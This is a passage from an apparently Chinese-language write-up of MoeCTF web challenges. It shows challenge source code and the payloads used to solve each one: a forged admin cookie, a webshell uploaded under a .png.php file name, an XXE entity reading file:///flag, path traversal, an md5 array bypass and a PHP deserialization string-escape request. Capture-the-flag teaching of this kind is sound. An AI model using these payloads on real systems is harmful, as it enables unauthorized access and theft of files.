class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123456&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123456&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>登入成功</p><p>尝试访问&#x2F;flag，提示</p><p>{“error”: “ok”, “data”: {“flag”: “flag{sorry_but_you_are_not_admin}”}}</p><p>抓包发现cookie</p><p>base64解码后为{“username”: “zijie”, “password”: “123456”, “role”: “user”}</p><p>修改user为admin后base64编码放回cookie里</p><p>再次访问&#x2F;flag</p><p>得到flag</p><p>{“error”: “ok”, “data”: {“flag”: “moectf{cooKi3_is_d3licious_MA9iVff90SSJ!!M6Mrfu9ifxi9i!JGofMJ36D9cPMxro}”}}</p><h3 id="Web-gas-gas-gas"><a href="#Web-gas-gas-gas" class="headerlink" title="Web-gas!gas!gas!"></a>Web-gas!gas!gas!</h3><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br>session=requests.session()<br>url=<span class="hljs-string">&quot;http://localhost:59398&quot;</span><br>data=&#123;<br><span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;ttycp3&quot;</span>,<br><span class="hljs-string">&quot;steering_control&quot;</span>:<span class="hljs-string">&#x27;0&#x27;</span>,<br><span class="hljs-string">&quot;throttle&quot;</span>:<span class="hljs-string">&#x27;2&#x27;</span><br>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>s=session.post(url=url,data=data)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;moectf&quot;</span> <span class="hljs-keyword">in</span> s.text:<br><span class="hljs-built_in">print</span>(s.text)<br><span class="hljs-keyword">break</span><br>att=re.findall(<span class="hljs-string">&quot;&lt;font color=\&quot;red\&quot;&gt;([\u4e00-\u9fa5！，]+)&quot;</span>,s.text)<br><span class="hljs-built_in">print</span>(att)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;直行&quot;</span> <span class="hljs-keyword">in</span> att[<span class="hljs-number">0</span>]:<br>data[<span class="hljs-string">&quot;steering_control&quot;</span>]=<span class="hljs-string">&#x27;0&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;左&quot;</span> <span class="hljs-keyword">in</span> att[<span class="hljs-number">0</span>]:<br>data[<span class="hljs-string">&quot;steering_control&quot;</span>]=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-built_in">print</span>(data)<br><span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;右&quot;</span> <span class="hljs-keyword">in</span> att[<span class="hljs-number">0</span>]:<br>data[<span class="hljs-string">&quot;steering_control&quot;</span>]=<span class="hljs-string">&#x27;-1&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;保持&quot;</span> <span class="hljs-keyword">in</span> att[<span class="hljs-number">0</span>]:<br>data[<span class="hljs-string">&quot;throttle&quot;</span>]=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;大&quot;</span> <span class="hljs-keyword">in</span> att[<span class="hljs-number">0</span>]:<br>data[<span class="hljs-string">&quot;throttle&quot;</span>]=<span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;小&quot;</span> <span class="hljs-keyword">in</span> att[<span class="hljs-number">0</span>]:<br>data[<span class="hljs-string">&quot;throttle&quot;</span>]=<span class="hljs-string">&#x27;0&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="Web-moe图床"><a href="#Web-moe图床" class="headerlink" title="Web-moe图床"></a>Web-moe图床</h3><p>该题只允许上传png后缀文件，且不能上传.htaccess文件</p><p>抓包发现更改name值后显示源码</p><p><a href="https://imgloc.com/image/L5lim"><img src="https://i.imgs.ovh/2023/10/08/L5lim.png" alt="L5lim.png"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$targetDir</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span>;<br><span class="hljs-variable">$allowedExtensions</span> = [<span class="hljs-string">&#x27;png&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$tmp_path</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;type&#x27;</span>] !== <span class="hljs-string">&#x27;image/png&#x27;</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;文件类型不符合要求&#x27;</span>]));<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$tmp_path</span>) &gt; <span class="hljs-number">512</span> * <span class="hljs-number">1024</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;文件太大&#x27;</span>]));<br>&#125;<br><span class="hljs-variable">$fileName</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$fileNameParts</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$fileName</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$fileNameParts</span>) &gt;= <span class="hljs-number">2</span>) &#123;<br><span class="hljs-variable">$secondSegment</span> = <span class="hljs-variable">$fileNameParts</span>[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$secondSegment</span> !== <span class="hljs-string">&#x27;png&#x27;</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;文件后缀不符合要求&#x27;</span>]));<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;文件后缀不符合要求&#x27;</span>]));<br>&#125;<br><span class="hljs-variable">$uploadFilePath</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$targetDir</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_path</span>, <span class="hljs-variable">$uploadFilePath</span>)) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;file_path&#x27;</span> =&gt; <span class="hljs-variable">$uploadFilePath</span>]));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;文件上传失败&#x27;</span>]));<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>审计发现只对第一个点后的后缀检查，传shell.png.php绕过</p><p>蚁剑连接</p><h3 id="Web-了解你的座驾"><a href="#Web-了解你的座驾" class="headerlink" title="Web-了解你的座驾"></a>Web-了解你的座驾</h3><p>抓包发现图片通过POST方式发送xml信息来获取</p><p>即xxe漏洞，payload进行ulr编码后发送</p><p>payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">feng</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span>  <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xml</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xml</span>&gt;</span><br></code></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/6887#toc-2">从XML相关一步一步到XXE漏洞</a></p><h3 id="Web-大海捞针"><a href="#Web-大海捞针" class="headerlink" title="Web-大海捞针"></a>Web-大海捞针</h3><p><img src="https://i.imgs.ovh/2023/10/08/LYAOv.png" alt="LYAOv.png"></p><p>使用Burpsuit的Intruder模块进行爆破，在长度明显与别的有很大差别的163中找到flag</p><p><img src="https://i.imgs.ovh/2023/10/08/LYHK9.png" alt="LYHK9.png"></p><h3 id="Web-meo图床"><a href="#Web-meo图床" class="headerlink" title="Web-meo图床"></a>Web-meo图床</h3><p>未对后缀做限制，给出了文件路径，访问后为空白<br>构造报错后</p><p><img src="https://i.imgs.ovh/2023/10/08/LYwXH.png" alt="LYwXH.png"></p><p>尝试利用file_get_contents()函数</p><p><code>images.php?name=../../../flag</code>，访问后并没有提示404而是有一个图片格式的样式，下载下来用记事本打开就可以看见文件内容，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml">hello~<br>Flag Not Here~<br>Find Somewhere Else~<br><br><br><span class="hljs-comment">&lt;!--Fl3g_n0t_Here_dont_peek!!!!!.php--&gt;</span><br><br>Not Here~~~~~~~~~~~~~ awa<br></code></pre></td></tr></table></figure><p>访问<code>Fl3g_n0t_Here_dont_peek!!!!!.php</code>内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>])) &#123;<br><span class="hljs-variable">$param1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param1&#x27;</span>];<br><span class="hljs-variable">$param2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$param1</span> !== <span class="hljs-variable">$param2</span>) &#123;<br><br><span class="hljs-variable">$md5Param1</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$param1</span>);<br><span class="hljs-variable">$md5Param2</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$param2</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5Param1</span> == <span class="hljs-variable">$md5Param2</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;O.O!! &quot;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;FLAG&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;O.o??&quot;</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;o.O?&quot;</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;O.o?&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> O.o?<br></code></pre></td></tr></table></figure><p>数组绕过得到flag</p><h3 id="Web-夺命十三枪"><a href="#Web-夺命十三枪" class="headerlink" title="Web-夺命十三枪"></a>Web-夺命十三枪</h3><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;Hanxin.exe.php&#x27;</span>);<br><br><span class="hljs-variable">$Chant</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;chant&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;chant&#x27;</span>] : <span class="hljs-string">&#x27;夺命十三枪&#x27;</span>;<br><br><span class="hljs-variable">$new_visitor</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span>(<span class="hljs-variable">$Chant</span>);<br><br><span class="hljs-variable">$before</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$new_visitor</span>);<br><span class="hljs-variable">$after</span> = <span class="hljs-title class_">Deadly_Thirteen_Spears</span>::<span class="hljs-title function_ invoke__">Make_a_Move</span>(<span class="hljs-variable">$before</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Movements: &#x27;</span> . <span class="hljs-variable">$after</span> . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$after</span>);<br>&#125;<span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Even Caused A Glitch...&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Hanxin.exe.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>]) === <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-keyword">__FILE__</span>)) &#123;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Deadly_Thirteen_Spears</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$Top_Secret_Long_Spear_Techniques_Manual</span> = <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&quot;di_yi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Lovesickness&quot;</span>,<br><span class="hljs-string">&quot;di_er_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Heartbreak&quot;</span>,<br><span class="hljs-string">&quot;di_san_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Blind_Dragon&quot;</span>,<br><span class="hljs-string">&quot;di_si_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Romantic_charm&quot;</span>,<br><span class="hljs-string">&quot;di_wu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Peerless&quot;</span>,<br><span class="hljs-string">&quot;di_liu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;White_Dragon&quot;</span>,<br><span class="hljs-string">&quot;di_qi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Penetrating_Gaze&quot;</span>,<br><span class="hljs-string">&quot;di_ba_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Kunpeng&quot;</span>,<br><span class="hljs-string">&quot;di_jiu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Night_Parade_of_a_Hundred_Ghosts&quot;</span>,<br><span class="hljs-string">&quot;di_shi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Overlord&quot;</span>,<br><span class="hljs-string">&quot;di_shi_yi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Letting_Go&quot;</span>,<br><span class="hljs-string">&quot;di_shi_er_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Decisive_Victory&quot;</span>,<br><span class="hljs-string">&quot;di_shi_san_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Unrepentant_Lethality&quot;</span><br>);<br><br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Make_a_Move</span>(<span class="hljs-params"><span class="hljs-variable">$move</span></span>)</span>&#123;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$index</span> =&gt; <span class="hljs-variable">$movement</span>)&#123;<br><span class="hljs-variable">$move</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$index</span>, <span class="hljs-variable">$movement</span>, <span class="hljs-variable">$move</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$move</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span></span>&#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$Chant</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$Spear_Owner</span> = <span class="hljs-string">&#x27;Nobody&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$chant</span></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;Chant = <span class="hljs-variable">$chant</span>;<br><span class="hljs-variable language_">$this</span>-&gt;Spear_Owner = <span class="hljs-string">&#x27;Nobody&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;Spear_Owner !== <span class="hljs-string">&#x27;MaoLei&#x27;</span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Far away from COOL...&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Omg You&#x27;re So COOOOOL!!! &quot;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>);<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>字符串逃逸</p><p><code>&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code>共35个字符</p><p>找出相应字符串复制几遍逃逸</p><p><code>&quot;di_qi_qiang&quot; =&gt; &quot;Penetrating_Gaze&quot;</code>逃逸5个字符</p><p><code> &quot;di_shi_san_qiang&quot; =&gt; &quot;Unrepentant_Lethality&quot;</code>逃逸5个字符</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">GET /?chant=di_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiang<span class="hljs-string">&quot;;s:11:&quot;</span>Spear_Owne<span class="hljs-string">r&quot;;s:6:&quot;</span>MaoLei<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Web-signin"><a href="#Web-signin" class="headerlink" title="Web-signin"></a>Web-signin</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> users, salt<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> http.server<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>FLAG = f.read().strip()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gethash</span>(<span class="hljs-params">*items</span>):<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br><span class="hljs-keyword">if</span> item <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br><span class="hljs-keyword">continue</span><br>c ^= <span class="hljs-built_in">int</span>.from_bytes(hashlib.md5(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;salt&#125;</span>[<span class="hljs-subst">&#123;item&#125;</span>]<span class="hljs-subst">&#123;salt&#125;</span>&quot;</span>.encode()).digest(), <span class="hljs-string">&quot;big&quot;</span>) <span class="hljs-comment"># it looks so complex! but is it safe enough?</span><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:]<br><span class="hljs-keyword">assert</span> <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">in</span> users<br><span class="hljs-keyword">assert</span> users[<span class="hljs-string">&quot;admin&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span><br>hashed_users = <span class="hljs-built_in">dict</span>((k,gethash(k,v)) <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> users.items())<br><span class="hljs-built_in">eval</span>(<span class="hljs-built_in">int</span>.to_bytes(<span class="hljs-number">0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164</span>^<span class="hljs-number">8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153</span>,<span class="hljs-number">160</span>,<span 